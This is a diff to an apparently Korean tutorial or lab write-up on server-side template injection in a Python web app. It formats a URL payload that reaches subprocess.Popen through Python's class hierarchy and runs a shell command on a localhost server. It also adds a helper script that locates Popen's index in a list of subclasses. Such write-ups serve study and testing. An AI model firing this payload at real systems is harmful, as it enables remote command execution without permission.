@@ -63,6 +63,19 @@ os의 config딕셔너리가 추가시켜준다.
 
 popen클래스를 찾을 수 있는데, 슬라이싱을 통해서 popen의 위치를 찾을 수 있다.
 
-	http://127.0.0.1:8080/?content={{%27%27.__class__.__mro__[1].__subclasses__()[202](%27ls%27,shell=True,stdout=-1).communicate()}}
+	`http://127.0.0.1:8080/?content={{%27%27.__class__.__mro__[1].__subclasses__()[202](%27ls%27,shell=True,stdout=-1).communicate()}}`
 
-최종 코드다.
+
+# subprocess.Popen 인덱스 찾기 스크립트
+```python
+with open("list.txt", "r") as f:
+    line = f.readline()
+
+classes = [item.strip() for item in line.split(",")]
+
+try:
+    index = classes.index("<class 'subprocess.Popen'>")
+    print(f"'popen' is at index {index}")
+except ValueError:
+    print("'popen' not found in the list")
+```
